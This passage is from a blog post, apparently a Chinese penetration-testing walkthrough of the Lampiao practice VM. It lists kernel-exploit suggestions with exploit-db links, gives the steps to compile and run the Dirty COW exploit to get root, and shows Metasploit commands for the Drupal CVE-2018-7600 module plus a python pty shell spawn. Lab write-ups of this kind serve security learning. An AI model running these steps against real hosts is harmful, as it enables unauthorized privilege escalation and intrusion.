https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c</span><br><span class="line">   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-4557] double-fdput()</span><br><span class="line"></span><br><span class="line">   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;</span><br><span class="line">   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</span><br><span class="line">   Comments: CONFIG_BPF_SYSCALL needs to be set &amp;&amp; kernel.unprivileged_bpf_disabled != 1</span><br><span class="line"></span><br><span class="line">[+] [CVE-2015-1318] newpid (apport) 2</span><br><span class="line"></span><br><span class="line">   Details: http://openwall.com/lists/oss-security/2015/04/14/4</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: ubuntu=14.04.2</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/36782</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-0728] keyring</span><br><span class="line"></span><br><span class="line">   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40003</span><br><span class="line">   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working</span><br></pre></td></tr></table></figure>
+
+<p>按照渗透的思想，就应该一个一个去枚举，去尝试，这里最后利用的脏牛漏洞来提权，即</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] [CVE-2016-5195] dirtycow 2</span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40839</span><br><span class="line">   ext-url: https://www.exploit-db.com/download/40847</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br></pre></td></tr></table></figure>
+
+<p>编号是<code>40847</code>，我们可以直接在kali里面找到这个脚本，<code>searchsploit 40847</code> </p>
+<p><img src="https://yk.jsdu.cn/20260223/1f37eb8240c506d8bb082bb85a2ecd93.png" alt="Lampiao2"></p>
+<p>路径<code>/usr/share/exploitdb/exploits/linux/local/40847.cpp</code>，这是一个<code>c++</code>文件，肯定是要编译了才能运行的。我们可以上网搜一下怎么编译利用。google搜索一下关键字<code>40847 exploit</code>找到</p>
+<p><img src="https://yk.jsdu.cn/20260223/49bb6d401acfbfe31dbe2d860060de66.png" alt="Lampiao3"></p>
+<p>第一行就是编译命令：<code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</code> ，所以我们用同样的手法，把kali2022的40847.cpp文件下载到靶机的tmp目录下面， 然后赋予执行权限。接着编译，运行即可：</p>
+<p><img src="https://yk.jsdu.cn/20260223/36f35bdc3620c2be6c3cfb71406ea217.png" alt="Lampiao4"></p>
+<p>运行编译好的提权文件就可以拿到root的密码。然后以root的身份ssh连过去就OK了。(注意我这里是把<code>40847.cpp</code>放到了kali的桌面上，然后再桌面上面起的web服务)</p>
+<h1 id="拿www-data权限"><a href="#拿www-data权限" class="headerlink" title="拿www-data权限"></a>拿www-data权限</h1><p>说完了拿root的账号密码，这里其实还有一个利用的地方，就是拿1898 这个端口web服务的<code>www-data</code>权限。通过这个学习了一下xray的被动扫描模式的使用方式。只是很可惜我这里并没有通过<code>xray</code>扫描出<code>drupal</code>的漏洞。但其实poc里面是有这个版本(<code>poc-yaml-drupal-cve-2018-7600-rce</code>)的漏洞的。具体原因我也没找到…..</p>
+<p>这里就利用kali的msf来复现一下吧，就当作已知存在该版本的漏洞，具体使用方式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">step 1: msfconsole</span><br><span class="line">step 2: search drupal</span><br><span class="line">step 3: use 1  //2018那个版本的漏洞</span><br><span class="line">step 4: show opthions</span><br><span class="line">step 5: set RHOSTS 192.168.4.131</span><br><span class="line">step 6: set RPORT 1898</span><br><span class="line">step 7: run</span><br><span class="line">拿到的是 metepreter,接着执行shell，再接着通过python拿到一个ttl: python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>如下图所示：</p>
+<p><img src="https://yk.jsdu.cn/20260223/784df330b708fb1dc2bb6ce33f3e9350.png" alt="Lampiao5"></p>
+<p><img src="https://yk.jsdu.cn/20260223/dfc33a783760cf84f34d6189d94923cc.png" alt="Lampiao6"></p>
+<p>另外通过msf拿到的<code>meterpreter</code> 是msf框架的 “shell” ，它有自己单独的一些命令体系，比如<code>upload、download、systeminfo</code>等等。它本身不是原系统的shell命令体系，所以很多命令比如<code>id,whoami</code>啥的就执行不了，所以需要运行一个<code>shell</code>命令来关联原系统的shell 。另外直接一个shell会发现交互很不方便，于是可以通过python来运行一个tty伪终端:<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code> ，当然这个前提是得有python环境。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA/" rel="tag"># 渗透靶机</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/02/20/GoldenEye/" rel="prev" title="GoldenEye">
+                  <i class="fa fa-angle-left"></i> GoldenEye
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
